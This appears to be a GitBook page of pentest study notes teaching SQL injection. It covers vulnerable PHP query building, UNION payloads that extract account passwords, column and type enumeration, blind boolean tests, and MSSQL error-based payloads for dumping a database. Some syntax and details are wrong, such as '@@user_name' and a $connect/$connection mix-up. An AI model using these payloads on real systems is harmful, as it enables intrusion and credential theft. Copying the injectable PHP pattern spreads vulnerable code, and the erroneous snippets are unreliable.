
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>SQLi Basics Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../pentest-stuff/samba.html" />
    
    
    <link rel="prev" href="http-basics.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Yo
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Web Stuff</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="http-basics.html">
            
                <a href="http-basics.html">
            
                    
                    HTTP Basics
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="2.2" data-path="sqli-basics.html">
            
                <a href="sqli-basics.html">
            
                    
                    SQLi Basics
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Pentest Stuff</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../pentest-stuff/samba.html">
            
                <a href="../pentest-stuff/samba.html">
            
                    
                    SAMBA
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >SQLi Basics</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="sqli-basics">SQLi Basics</h1>
<p>SQL statement structure</p>
<pre><code class="lang-text">&gt; SELECT &lt;column list&gt; FROM &lt;table&gt; WHERE &lt;conditions&gt;

&gt; SELECT name, description FROM products WHERE id=9;
&gt; SELECT 22, &apos;string&apos;, 0x12, &apos;another string&apos;;
</code></pre>
<p>UNION performs an union between two results:</p>
<pre><code class="lang-text">&gt; &lt;select statement&gt; UNION &lt;second select statement&gt;;
</code></pre>
<p>If a table contains duplicate rows, use the DISTINCT operator to filter out duplicate entries</p>
<pre><code class="lang-text">&gt; SELECT DISTINCT &lt;field list&gt; &lt;remainder of statement&gt;;
</code></pre>
<p>UNION statement implies DISTINCT by default.</p>
<p>You can perform UNION with chosen data:</p>
<pre><code class="lang-text">&gt; SELECT Name, Description FROM Products WHERE ID=&apos;2&apos; UNION SELECT &apos;Example&apos;, &apos;Data&apos;;
</code></pre>
<p>Example of union:</p>
<pre><code class="lang-text">&gt; SELECT Name, Description FROM Products WHERE ID=&apos;2&apos; UNION SELECT Username, Password FROM Accounts;
</code></pre>
<p>This query will get the name and description of the item which ID is 3 and all usernames and passwords from the Accounts table</p>
<p>Comments:</p>
<pre><code class="lang-text">&gt; SELECT field FROM table; # this is a comment
&gt; SELECT field FROM table; -- this is another comment
</code></pre>
<p>Web applications when using databases must:</p>
<ol>
<li>Connect to the database</li>
<li>Submit the query to the database</li>
<li>Retrieve the results</li>
</ol>
<p>Example of php connection to MySQL:</p>
<pre><code class="lang-text">$dbhost=&apos;1.1.1.1&apos;;
$dbuser=&apos;username&apos;;
$dbpass=&apos;password&apos;;
$dbname=&apos;database&apos;;

$connect = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname);
$query = &quot;SELECT Name, Description FROM Products WHERE ID=&apos;2&apos; UNION SELECT Username, Password FROM Accounts;&quot;;

$results = mysqli_query($connection, $query);
display_results($results);
</code></pre>
<p>mysqli_query() is a function which submits the query to the database<br>display_results() function renders the data</p>
<p>The query above is a static query, and most of the time this is not what you find in the real world. Generally you want to query the database based on what the client is trying to do, like searching for a product by its name or ID:</p>
<pre><code class="lang-text">$id = $_GET[&apos;id&apos;];

&lt;ommited db variables&gt;

$connect = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname);
$query = &quot;SELECT Name, Description FROM Products WHERE ID=&apos;$id&apos;;&quot;;

$results = mysqli_query($connection, $query);
display_results($results);
</code></pre>
<p>In this case, you have a query which uses the GET id parameter to build a query. This means the client can manipulate the query and construct it in a way that it returns information the client is not suppose to receive. Let&apos;s say the client provide the following information as the id:</p>
<pre><code class="lang-text">&apos; OR &apos;a&apos;=&apos;a
</code></pre>
<p>the query would become:</p>
<pre><code class="lang-text">&gt; SELECT Name, Description FROM Products WHERE ID=&apos;&apos; OR &apos;a&apos;=&apos;a&apos;;
</code></pre>
<p>Setting up two conditions:</p>
<ul>
<li>ID must be empty OR</li>
<li>an always true condition (A will always be equal to A)</li>
</ul>
<p>Since the second condition will always be fullfilled, this basically means that you can return the Name and Description from the table products whenever A = A, in another words, it will return the entier table.</p>
<p>Is always possible to exploit the UNION command:</p>
<pre><code class="lang-text">&apos; UNION SELECT Username, Password FROM Accounts WHERE &apos;a&apos;=&apos;a
</code></pre>
<p>So the query becomes:</p>
<pre><code class="lang-text">&gt; SELECT Name, Description FROM Products WHERE ID=&apos;&apos; UNION SELECT Username, Password FROM Accounts WHERE &apos;a&apos;=&apos;a&apos;;
</code></pre>
<p>So you can get informations from tables that are not even being used, in this case, you can basically dump the entire database through an SQLi.</p>
<p>How critical is a SQLi?</p>
<ol>
<li>Depends on the DBMS (Mysql, SQL server, Oracle DB, etc.)</li>
<li>Some DBMS allows you to run commands in the host machine, so you can get information for a foothold or even a foothold itself (shell, LFI, host OS information)</li>
</ol>
<p>When and Where SQLi can be found?</p>
<p>Generally in input fields where the client can insert data (injection points), then manipulate the input in a way you can take control over the dynamic query.</p>
<p>The most common way to do that (script kiddie shit here) is to input characters which breaks the SQL query and see if the application returns an error, like an &apos;</p>
<p>Not all inputs are used to build a query, so you need to checkout all the different input parameters and check which is used for database data retrieval.</p>
<p>Input parameters are carried through GET and POST requests.</p>
<p>Beyond trying an &apos;, you can:</p>
<ul>
<li>Use &quot; as well</li>
<li>SELECT, UNION and other sql commands</li>
<li>Comments, # or --</li>
</ul>
<p>How do I know that the I found an SQLi?</p>
<p>When you break the sqli using the characters above, the application may throw out an error, every DMBS responds to incorrect sql queries differently:</p>
<p>MS-SQL:</p>
<pre><code class="lang-text">Incorrect syntax near [query snippet]
</code></pre>
<p>MySQL:</p>
<pre><code class="lang-text">You have an error in your SQL syntax. Check the manual that corresponds /
to your MySQL server vrsion for the right syntax to use near [query snippet]
</code></pre>
<p>Finding these errors means is very likely the application is vulnerable. In the real world, most websites does not display such errors, in this case, you need to test using binary/true-false/boolean based queries.</p>
<p>Remember, you generally can&apos;t see the query, so you need to wrap your brain around the site and understand the input fields and how the information return relates to it so you can start building how it works.</p>
<p>Adding a second required condition is a way to test that, add to the query</p>
<pre><code class="lang-text">and &apos;a&apos;=&apos;a
</code></pre>
<p>And see if it still works. Then try to set a second required condition which is not met, like:</p>
<pre><code class="lang-text">and &apos;a&apos;=&apos;b
</code></pre>
<p>And see if it stops working</p>
<p>What are the types of SQLi attacks?</p>
<ul>
<li>In-Band SQLi</li>
<li>Error-Based SQLi</li>
<li>Blind SQLi</li>
</ul>
<p>in-band SQL uses the same channel to inject and receive information, like an webapp page field.</p>
<p>Error-based is when you force the DBMS to output error messages and use that to perform data exfiltration, like via reports or warning e-mails</p>
<p>Blind SQL means the application does not reflect back the reply of you query, this means you can&apos;t see the output and needs to rely on true-false / binary conditions and requests, like &apos;Is the first letter of the user A? If not, waits 3 seconds before replying&apos;, and keep asking the database until you can gather enough information.</p>
<p>How to exploit in-band SQLi?</p>
<p>The best way to exploit in-band sqli is with the UNION command. However, there are some important things you need to take in account:</p>
<ul>
<li>The field types of the second SELECT must match the ones in the first statemement.</li>
<li>The number of fields in the second SELECT must match the first statement.</li>
<li>To successfully perform the attack, we need to understand the structure of the database (tables and columns).</li>
</ul>
<p>To solve the first two issues, lets enumerate the number of columns/fields a query selects:</p>
<pre><code class="lang-text">mysql_query(&quot;SELECT id, real_name FROM users WHERE id=&quot;.$GET[&apos;id&apos;].&quot;;&quot;);
</code></pre>
<p>The columns and data types are:</p>
<ul>
<li>id has data type int</li>
<li>real_name has data type varchar (string)</li>
</ul>
<p>In this case, for the second SELECT statement using UNION, if we select more than 2 columns or if the number is correct but the data type is different it will not work and will try to throw an error:</p>
<p>MySQL:</p>
<pre><code class="lang-text">The used SELECT statement have a different number of columns
</code></pre>
<p>MS SQL:</p>
<pre><code class="lang-text">All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target list.
</code></pre>
<p>PostgreSQL:</p>
<pre><code class="lang-text">Each UNION query must have the same number of columns.
</code></pre>
<p>Oracle:</p>
<pre><code class="lang-text">ORA-01789: query block has incorrect number of result columns.
</code></pre>
<p>Detecting the number of fields needed to exploit an in-band SQL injection looks like:</p>
<pre><code class="lang-text">&gt; 9999 UNION SELECT NULL; ---
&gt; 9999 UNION SELECT NULL, NULL; ---
&gt; 9999 UNION SELECT NULL, NULL, NULL; ---
&gt; 9999 UNION SELECT NULL, NULL, NULL, NULL; ---

Another example:

&gt; 1111&apos; UNION SELECT NULL; -- -
&gt; 1111&apos; UNION SELECT NULL, NULL; -- -
&gt; 1111&apos; UNION SELECT NULL, NULL, NULL; -- -
&gt; 1111&apos; UNION SELECT NULL, NULL, NULL, NULL; -- -
</code></pre>
<p>For the query to work, the number of NULL fields must match, so we can just keep adding it until the app doesn&apos;t throw an error anymore, as the two statements finally will be balanced (with the same number of fields in both SELECT statements).</p>
<p>This can be used even when the application does not throw an error when the query is wrong. Generally it will not display anything or the page will be messed up, so you can keep adding NULL to the query til it works.</p>
<p>Now, to discover the datatype of each field, we can simply repeat the same exercise since most DBMS won&apos;t allow UNION based queries if the datatype are different, therefore:</p>
<pre><code class="lang-text">&gt; SELECT 1 UNION &apos;a&apos;;
</code></pre>
<p>Won&apos;t work and will trigger an error.</p>
<table>
<thead>
<tr>
<th style="text-align:left">DBMS</th>
<th style="text-align:left">Datatype enforcing</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left">No</td>
</tr>
<tr>
<td style="text-align:left">MSSQL</td>
<td style="text-align:left">Yes</td>
</tr>
<tr>
<td style="text-align:left">ORACLE</td>
<td style="text-align:left">Yes</td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left">Yes</td>
</tr>
</tbody>
</table>
<p>Now, we:</p>
<ul>
<li>Substitute one of the null fields with a constant.</li>
<li>If the constant type is correct, the query will work</li>
<li>If the type is wrong, the webapp will throw an error or misbehave</li>
</ul>
<p>So after finding the number of fields, we change the datatypes:</p>
<pre><code class="lang-text">&gt; 1111&apos; UNION SELECT NULL, NULL; -- -
#Change first field to int
&gt; 1111&apos; UNION SELECT 1, NULL; -- -
#If no errors, change the second field to int
&gt; 1111&apos; UNION SELECT 1, 1; -- -
#If errors, change the second field to string
&gt; 1111&apos; UNION SELECT 1, &apos;a&apos;; -- -
</code></pre>
<p>How to exploit error-based SQLi?</p>
<p>Extracting information using error-based SQLi is really quick and its available in ORACLE, postgreSQL and MSSQL.</p>
<p>Most of the time the error message is not reflected in the webapp output, but it can be embedded in an email message or appended to a log file. We can use error-based SQLi to dump information about the database itself, like database names, schemas and useful data.</p>
<p>Schemas are databases which purpose is to describe all other user-defined databases.</p>
<p>in MSSQL, the name of the database objects are revealed within errors. the user sa is the super admin and has access to the master database. The master database contains schemas of user-defined dbs.</p>
<p>First thing we can do to start exploting it is to discover the database version, we can trigger a type conversion error for that:</p>
<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(&lt;FIELDNAME&gt; as varchar(4096)) from &lt;TABLENAME&gt; WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;)); --
</code></pre>
<ul>
<li><code>99999</code> is a bogus value.</li>
<li><code>or 1 in</code> is the part of the query that will trigger the error, we are trying to find 1, an integer, within a varchar column.</li>
<li><code>CAST(&lt;FIELDNAME&gt; as varchar(4096))</code> is where we insert the column that we want to dump (either user-based or special database column). </li>
<li><code>&lt;FIELDNAME&gt;</code> can also be a SQL function like <code>user_name()</code> or a variable like <code>@@version</code></li>
<li><code>WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;)</code> this part is used to dump the database and can be ommited or ajusted.</li>
</ul>
<p>To retrieve the SQL version:</p>
<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096))) --
</code></pre>
<pre><code class="lang-text">[Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value &apos;Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) Jun 28 2012 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor) &apos; to data type int.
</code></pre>
<p>So, with all this information, how can I dump the entire database?</p>
<p>First of all, we need to discover some stuff:</p>
<ul>
<li>Current database username</li>
</ul>
<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(@@user_name as varchar(4096))) --
</code></pre>
<ul>
<li>Current databases and all other databases the user can read</li>
</ul>
<pre><code class="lang-text">99999 or 1 in (SELECT TOP 1 CAST(@@db_name(0) as varchar(4096))) --
99999 or 1 in (SELECT TOP 1 CAST(@@db_name(1) as varchar(4096))) --
99999 or 1 in (SELECT TOP 1 CAST(@@db_name(2) as varchar(4096))) --
</code></pre>
<ul>
<li>The tables into a given database</li>
</ul>
<p>To enumerate all tables in a database, we can use the following payload:</p>
<pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST(name as varchar (4096)) FROM &lt;database name&gt;..sysobjects WHERE xtype=&apos;U&apos; and name NOT IN (&lt;known table list&gt;)); --
</code></pre>
<pre><code>- `xtype means=&apos;U&apos;` means we only want user-defined tables
- `name NOT IN (&apos;&lt;know table list&gt;&apos;)` name is a column of the sysobjects table. Everytime we find a new table we will append it to the NOT IN list. This is needed because the error display only the first table name.
</code></pre><ul>
<li>The columns of a given table</li>
</ul>
<p>After retrieving the tables, we can retrieve the columns using the following payload:</p>
<pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST (&lt;db name&gt;..syscolumns.name as varchar (4096)) FROM &lt;db name&gt;..syscolumns,&lt;db name&gt;..sysobjects WHERE &lt;db name&gt;..syscolumns.id=&lt;db name&gt;..sysobjects.id AND &lt;dbname&gt;. .sysobjects.name=&lt;table name&gt; AND &lt;db name&gt;..syscolumns.name NOT IN (&lt;known column list&gt;)); --
</code></pre>
<pre><code>- `&lt;db name&gt;` is the name of database we&apos;re working on
- `&lt;table name&gt;` is the table which we&apos;re trying to find the columns
- `&lt;known column list&gt;` list of columns we already discovered
</code></pre><p>Finally, to dump the database, we can use the following query:</p>
<pre><code class="lang-text">9999 or 1 in (SELECT TOP 1 CAST (&lt;column name&gt; as varchar (4096) ) FROM &lt;db name&gt;..&lt;table name&gt; WHERE &lt;column name&gt; NOT IN (&lt;retrieved data list&gt;)); -- -
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="http-basics.html" class="navigation navigation-prev " aria-label="Previous page: HTTP Basics">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../pentest-stuff/samba.html" class="navigation navigation-next " aria-label="Next page: SAMBA">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"SQLi Basics","level":"2.2","depth":1,"next":{"title":"SAMBA","level":"3.1","depth":1,"path":"pentest-stuff/samba.md","ref":"pentest-stuff/samba.md","articles":[]},"previous":{"title":"HTTP Basics","level":"2.1","depth":1,"path":"web-stuff/http-basics.md","ref":"web-stuff/http-basics.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web-stuff/sqli-basics.md","mtime":"2020-05-04T01:28:58.032Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-05-04T01:28:59.066Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

